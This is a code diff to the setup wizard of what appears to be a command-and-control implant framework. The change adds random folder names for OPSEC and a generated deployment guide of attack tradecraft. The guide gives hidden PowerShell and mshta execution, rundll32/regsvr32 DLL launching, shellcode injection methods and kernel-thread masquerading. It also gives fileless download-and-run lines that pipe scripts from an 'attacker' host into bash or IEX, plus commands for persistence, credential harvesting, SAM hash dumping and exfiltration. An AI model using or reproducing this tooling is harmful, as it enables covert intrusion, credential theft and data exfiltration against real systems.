@@ -40,7 +40,7 @@ _tz = _TzProxy()
 
 
 from providers import _p, ask, ask_int, ask_yn, err, info, ok, sep, step, warn
-from providers._notifications import _cancelable_run
+from providers._notifications import _cancelable_run, _check_cancelled
 from providers._session import (
     BaseTransport, MZ_MARKER, DOWNLOADS_DIR, _TEMPLATES_DIR,
     SessionProfile, Session, SessionManager,
@@ -48,6 +48,7 @@ from providers._session import (
 )
 from providers._monitor import HeartbeatMonitor, AsyncPoller, send_async, _initial_hb_check
 from providers._crypto import encrypt_command, decrypt_output, build_task, deploy_id_from_key
+from server.version import __version__ as _stratum_version
 
 
 # ══════════════════════════════════════════════════════════════════════════════
@@ -214,6 +215,32 @@ WIN_BLOB_FALLBACK_PATHS: list[str] = [
 ]
 
 # ══════════════════════════════════════════════════════════════════════════════
+#  RANDOM FOLDER NAMES
+# ══════════════════════════════════════════════════════════════════════════════
+
+_FOLDER_PREFIXES = [
+    "Backup", "Sync", "Archive", "Documents", "Reports",
+    "Resources", "Shared", "Data", "Projects", "Files",
+    "Assets", "Media", "Content", "Workspace", "Library",
+]
+
+_FOLDER_SUFFIXES = [
+    "Q1", "Q2", "Q3", "Q4", "2025", "2026",
+    "Final", "Draft", "Review", "Production",
+    "Team", "Internal", "External", "Client",
+    "Main", "Dev", "Staging", "Release",
+]
+
+
+def _random_folder() -> str:
+    r = _random.Random(os.urandom(4))
+    prefix = r.choice(_FOLDER_PREFIXES)
+    if r.random() < 0.5:
+        return f"/{prefix}_{r.choice(_FOLDER_SUFFIXES)}"
+    return f"/{prefix}{r.randint(1, 99):02d}"
+
+
+# ══════════════════════════════════════════════════════════════════════════════
 #  BASE CONFIG
 # ══════════════════════════════════════════════════════════════════════════════
 
@@ -230,6 +257,8 @@ class BaseConfig:
 
     agent_name_win:   str = ""   # rename EXE/DLL/BIN to this stem (e.g. "RuntimeBroker"); "" = keep default
     agent_name_linux: str = ""   # rename ELF to this stem (e.g. "systemd-resolved"); "" = keep default
+
+    session_label: str = ""     # operator-assigned label for identifying this session
 
     mode: str = "staged-enc"
 
@@ -563,7 +592,7 @@ class ProviderWizard(ABC):
     def _step_create_deploy_dir(self, cfg: BaseConfig, session_id: str) -> Path:
         base_dir = Path("deployments")
         base_dir.mkdir(exist_ok=True)
-        label = cfg.folder_path.strip("/").replace("/", "_") or "default"
+        label = cfg.session_label.replace(" ", "_").replace("/", "_") if cfg.session_label else (cfg.folder_path.strip("/").replace("/", "_") or "default")
         slug  = f"{self.PROVIDER_ID}_{label}_{session_id}"
         deploy_dir = base_dir / slug
         deploy_dir.mkdir(parents=True)
@@ -821,11 +850,20 @@ class ProviderWizard(ABC):
         cfg.mode = raw_mode
 
         _p([("", "")])
+        _p([("class:yellow", "  Session Label:")])
+        _p([("class:info",   "    Human-readable name to identify this session (e.g. target hostname, op name)")])
+        cfg.session_label = ask("Label", cfg.session_label)
+
+        _p([("", "")])
         _p([("class:yellow", "  Channel Paths:")])
-        fp = ask("Folder path", cfg.folder_path)
-        if not fp.startswith("/"):
-            fp = "/" + fp
-        cfg.folder_path    = fp.rstrip("/")
+        if ask_yn("Randomize folder path (OPSEC: avoids static folder fingerprint)", default=False):
+            cfg.folder_path = _random_folder()
+            ok(f"Random folder: {cfg.folder_path}")
+        else:
+            fp = ask("Folder path", cfg.folder_path)
+            if not fp.startswith("/"):
+                fp = "/" + fp
+            cfg.folder_path = fp.rstrip("/")
         cfg.input_file     = ask("Input file",     cfg.input_file)
         cfg.output_file    = ask("Output file",    cfg.output_file)
         cfg.heartbeat_file = ask("Heartbeat file", cfg.heartbeat_file)
@@ -887,6 +925,8 @@ class ProviderWizard(ABC):
         _row("Debug",     "ENABLED" if cfg.debug_mode else "off",
              "class:red" if cfg.debug_mode else "class:dim")
         _row("Provider",  self.PROVIDER_NAME)
+        if cfg.session_label:
+            _row("Label",     cfg.session_label)
         _row("Folder",    cfg.folder_path)
         _row("Input",     cfg.folder_path + cfg.input_file)
         _row("Output",    cfg.folder_path + cfg.output_file)
@@ -942,25 +982,95 @@ class ProviderWizard(ABC):
         fp        = cfg.folder_path
 
         if cfg.mode == "staged-enc":
+            _base = "stub"
             arch         = "ARCHITECTURE: STAGED ENCRYPTED PAYLOAD (key baked in stub)\n"
-            deploy_linux = f"  scp {deploy_dir}/agent/stub.sh user@target:/tmp/\n  ssh user@target 'chmod +x /tmp/stub.sh && nohup /tmp/stub.sh &>/dev/null &'\n"
-            deploy_win   = "  wscript stub.vbs          (no console flash — recommended)\n  powershell -ep bypass -w hidden -f stub.ps1  (direct, may flash briefly)\n"
         elif cfg.mode == "stageless-enc":
+            _base = "agent_stageless"
             arch         = "ARCHITECTURE: STAGELESS ENCRYPTED (key baked in stub)\n"
-            deploy_linux = f"  scp {deploy_dir}/agent/agent_stageless.sh user@target:/tmp/\n  ssh user@target 'chmod +x /tmp/agent_stageless.sh && nohup /tmp/agent_stageless.sh &>/dev/null &'\n"
-            deploy_win   = "  wscript agent_stageless.vbs   (no console flash — recommended)\n  powershell -ep bypass -w hidden -f agent_stageless.ps1  (direct, may flash briefly)\n"
         else:
+            _base = "agent"
             arch         = "ARCHITECTURE: STAGELESS PLAIN\n"
-            deploy_linux = f"  scp {deploy_dir}/agent/agent.sh user@target:/tmp/\n  ssh user@target 'chmod +x /tmp/agent.sh && nohup /tmp/agent.sh &>/dev/null &'\n"
-            deploy_win   = "  wscript agent.vbs          (no console flash — recommended)\n  powershell -ep bypass -w hidden -f agent.ps1  (direct, may flash briefly)\n"
+
+        w = cfg.agent_name_win or _base
+        l = cfg.agent_name_linux or _base
 
         common = (
             f"  Provider:  {self.PROVIDER_NAME}\n  Mode:      {cfg.mode}\n"
-            f"  Folder:    {fp}\n  Input:     {fp}{cfg.input_file}\n"
+            + (f"  Label:     {cfg.session_label}\n" if cfg.session_label else "")
+            + f"  Folder:    {fp}\n  Input:     {fp}{cfg.input_file}\n"
             f"  Output:    {fp}{cfg.output_file}\n  Heartbeat: {fp}{cfg.heartbeat_file}\n"
             f"  Sleep:     {cfg.base_sleep}s +/-{cfg.jitter_percent}%\n"
             + (f"  Window:    {cfg.window_start} → {cfg.window_end}\n" if cfg.window_start else "")
             + (f"  Kill date: {cfg.kill_date}\n" if cfg.kill_date else "")
+        )
+
+        deploy_linux = (
+            f"  scp {deploy_dir}/agent/{l}.sh user@target:/tmp/\n"
+            f"  ssh user@target 'chmod +x /tmp/{l}.sh && nohup /tmp/{l}.sh &>/dev/null &'\n"
+        )
+
+        deploy_win = (
+            f"  wscript {w}.vbs                                    (no console flash — recommended)\n"
+            f"  powershell -ep bypass -w hidden -f {w}.ps1          (direct, may flash briefly)\n"
+        )
+
+        tradecraft_dll = (
+            f"\n  DLL TRADECRAFT:\n"
+            f"  The DLL ({w}.dll) exports DllMain, Run, and DllRegisterServer.\n"
+            f"  Any method below starts the agent in a background thread.\n\n"
+            f"    rundll32.exe {w}.dll,Run                          (classic — runs via exported Run)\n"
+            f"    regsvr32 /s {w}.dll                               (COM registration — calls DllRegisterServer)\n"
+            f"    regsvr32 /s /n /i {w}.dll                         (silent, /n skips DllRegisterServer entry)\n"
+        )
+
+        tradecraft_shellcode = (
+            f"\n  SHELLCODE TRADECRAFT:\n"
+            f"  The .bin ({w}.bin) is x64 position-independent shellcode that embeds\n"
+            f"  the DLL and reflective-loads it in-memory (no file on disk, no LoadLibrary).\n\n"
+            f"    Use with any shellcode injector:\n"
+            f"    - CreateRemoteThread into a sacrificial process\n"
+            f"    - QueueUserAPC / NtQueueApcThread (early bird)\n"
+            f"    - Callback-based (EnumWindows, CertEnumSystemStore, etc.)\n"
+            f"    - Fiber / ThreadPoolWait injection\n"
+            f"    - Module stomping (load benign DLL, overwrite .text with shellcode)\n"
+            f"    - Syscall-based injection (direct/indirect NtAllocateVirtualMemory + NtCreateThreadEx)\n"
+            f"    Example (Python):\n"
+            f"      with open('{w}.bin','rb') as f: sc = f.read()\n"
+            f"      # inject sc into target process\n"
+        )
+
+        tradecraft_exe = (
+            f"\n  EXE TRADECRAFT:\n"
+            f"  The EXE ({w}.exe) is a standard PE. It can run directly or be used\n"
+            f"  with execution proxies:\n\n"
+            f"    {w}.exe                                           (direct execution)\n"
+            f"    start /b {w}.exe                                  (background, no new window)\n"
+            f"    wmic process call create \"{w}.exe\"                (WMI process create)\n"
+            f"    schtasks /create /tn \"Update\" /tr \"{w}.exe\" /sc once /st 00:00  (scheduled task)\n"
+        )
+
+        tradecraft_elf = (
+            f"\n  ELF TRADECRAFT:\n"
+            f"  The ELF ({l}.elf) is a static musl binary — zero runtime deps,\n"
+            f"  runs on any x86_64 Linux (no glibc/ld-linux required).\n\n"
+            f"    chmod +x {l}.elf && nohup ./{l}.elf &>/dev/null &  (background, survives logout)\n"
+            f"    setsid ./{l}.elf &>/dev/null &                     (new session leader, fully detached)\n"
+            f"    (exec -a [kworker/0:1] ./{l}.elf &)               (masquerade as kernel thread)\n"
+            f"    screen -dmS sess ./{l}.elf                        (inside screen, if available)\n"
+            f"    at now <<< './{l}.elf'                             (via at daemon, different parent)\n"
+        )
+
+        tradecraft_script = (
+            f"\n  SCRIPT TRADECRAFT:\n"
+            f"  The .sh ({l}.sh) is a self-extracting bash script that drops and runs\n"
+            f"  the ELF. The .ps1/.vbs are Windows equivalents.\n\n"
+            f"  Linux:\n"
+            f"    curl -s http://attacker/{l}.sh | bash              (fileless — pipe to bash)\n"
+            f"    wget -qO- http://attacker/{l}.sh | bash            (wget variant)\n"
+            f"    bash <(cat {l}.sh)                                 (process substitution)\n"
+            f"  Windows:\n"
+            f"    powershell -ep bypass -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker/{w}.ps1')\"\n"
+            f"    mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"{w}.vbs\"\",0:close\")  (LOLBin)\n"
         )
 
         guide = (
@@ -968,14 +1078,36 @@ class ProviderWizard(ABC):
             f"Session ID: {session_id}\n"
             f"Generated:  {_tz.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
             + arch + "\nCONFIGURATION:\n" + common
-            + "\nDEPLOY ON TARGET:\n  Linux:\n" + deploy_linux
+            + "\n" + "=" * 60 + "\n"
+            + "DEPLOY ON TARGET:\n"
+            + "\n  Linux:\n" + deploy_linux
             + "\n  Windows:\n" + deploy_win
+            + "\n" + "=" * 60 + "\n"
+            + "TRADECRAFT — EXECUTION METHODS:\n"
+            + tradecraft_exe
+            + tradecraft_dll
+            + tradecraft_shellcode
+            + tradecraft_elf
+            + tradecraft_script
+            + "\n" + "=" * 60 + "\n"
+            + "POST-DEPLOY:\n"
+            + "  /sleep <seconds>   — change beacon interval\n"
+            + "  /jitter <percent>  — add randomization to sleep\n"
+            + "  /persist probe     — enumerate persistence opportunities\n"
+            + "  /persist <method>  — install persistence (schtask/registry/cron/systemd)\n"
+            + "  /creds harvest     — passive credential collection (51 sources)\n"
+            + "  /creds sam         — dump SAM hashes (requires admin/SYSTEM)\n"
+            + "  /download <path>   — exfiltrate file via staging\n"
+            + "  /upload <path>     — upload file to target\n"
+            + "  /sysinfo           — full target reconnaissance\n"
             + "\nTERMINATE AGENT:\n  /kill  (inside controller)\n"
         )
         (deploy_dir / "DEPLOYMENT_GUIDE.txt").write_text(guide)
         (agent_dir / "README.txt").write_text(
             f"=== AGENT — {cfg.mode.upper()} ===\n\n" + arch + "\n" + common
             + "\nDEPLOY:\n  Linux:\n" + deploy_linux + "\n  Windows:\n" + deploy_win
+            + tradecraft_exe + tradecraft_dll + tradecraft_shellcode
+            + tradecraft_elf + tradecraft_script
         )
         ok("DEPLOYMENT_GUIDE.txt + agent/README.txt generated")
 
@@ -986,6 +1118,8 @@ class ProviderWizard(ABC):
         _p([("class:green", "  +=================================================================+")])
         _p([("", "")])
         _p([("class:cyan",   f"  Session ID:  {session_id}")])
+        if cfg.session_label:
+            _p([("class:cyan",   f"  Label:       {cfg.session_label}")])
         _p([("class:cyan",   f"  Provider:    {self.PROVIDER_NAME}")])
         _p([("class:cyan",   f"  Channel:     {cfg.folder_path + cfg.input_file}")])
         _p([("class:cyan",   f"  Mode:        {cfg.mode}")])
@@ -1617,6 +1751,7 @@ class ProviderWizard(ABC):
                 if not ask_yn("Continue anyway?", default=False):
                     raise _WizardError("Aborted — choose a unique folder path.")
 
+            _check_cancelled()
             if cfg.mode in ("staged-enc", "stageless-enc"):
                 self._step_generate_stub_secret(cfg)
 
@@ -1642,6 +1777,7 @@ class ProviderWizard(ABC):
                 except Exception as _cp_exc:
                     warn(f"Could not copy credentials to deploy dir: {_cp_exc}")
 
+            _check_cancelled()
             _priv_pem, pub_pem = self._step_keygen(keys_dir, session_id, cfg,
                                                     manager._key_password)
 
@@ -1652,18 +1788,24 @@ class ProviderWizard(ABC):
             cfg.s2l_suffix = "." + _h[22:28]
             cfg.s2w_suffix = "." + _h[28:34]
 
+            _check_cancelled()
             self.step_init_channel(cfg)
 
+            _check_cancelled()
             if cfg.mode == "staged-enc":
                 self.step_upload_stage2(cfg, agent_dir, pub_pem)
+                _check_cancelled()
                 self._step_generate_stubs(cfg, agent_dir, pub_pem)
             elif cfg.mode == "stageless-enc":
                 self.step_upload_stageless_enc(cfg, agent_dir, pub_pem)
             elif cfg.mode == "stageless-plain":
                 self._step_generate_agents_plain(cfg, agent_dir, pub_pem)
 
+            _check_cancelled()
             self._step_pad_scripts(agent_dir)
+            _check_cancelled()
             self._step_compile_artifacts(cfg, agent_dir, pub_pem)
+            _check_cancelled()
             if cfg.mode == "staged-enc":
                 self.step_upload_stage2_win(cfg, agent_dir)
             self._step_rename_agents(cfg, agent_dir)
@@ -1675,7 +1817,7 @@ class ProviderWizard(ABC):
             key_rel_path   = str(deploy_dir / "keys" / session_id / "private_key.pem")
             profile = SessionProfile(
                 session_id       = session_id,
-                label            = cfg.folder_path.strip("/"),
+                label            = cfg.session_label or cfg.folder_path.strip("/"),
                 provider         = self.PROVIDER_ID,
                 creds_file       = creds_rel_path,
                 private_key_file = key_rel_path,
@@ -1696,6 +1838,7 @@ class ProviderWizard(ABC):
                 kill_date        = cfg.kill_date    or "",
                 window_start     = cfg.window_start or "",
                 window_end       = cfg.window_end   or "",
+                stratum_version  = _stratum_version,
             )
 
             # Instantiate transport from freshly-obtained credentials
